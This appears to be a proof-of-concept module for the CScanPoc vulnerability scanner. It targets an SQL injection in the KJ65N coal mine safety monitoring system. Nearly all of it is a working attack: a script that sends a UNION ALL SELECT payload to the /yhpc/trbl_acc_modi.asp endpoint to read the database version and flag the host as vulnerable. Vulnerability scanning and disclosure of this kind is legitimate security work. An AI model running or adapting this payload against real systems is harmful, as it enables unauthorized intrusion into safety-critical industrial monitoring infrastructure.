# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    poc_id = '119bba35-4405-45ce-858c-0fa648bbc2d7'
    name = 'KJ65N煤矿安全监控系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-07'  # 漏洞公布时间
    desc = '''
        KJ65N 煤矿远程监控安全预警系统存在SQL注入漏洞。
        /yhpc/trbl_acc_modi.asp?pActFlag=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KJ65N煤矿安全监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '431819e5-969c-4ec1-9d98-48711672aff3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref::http://www.wooyun.org/bugs/wooyun-2010-0131730
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/yhpc/trbl_acc_modi.asp?pActFlag=MODIFY&pId=-7653%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)

            if code == 200 and "Microsoft SQL Server" in res:
                #security_hole('KJ65N煤矿远程监控安全预警系统SQL注入:%s'%target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
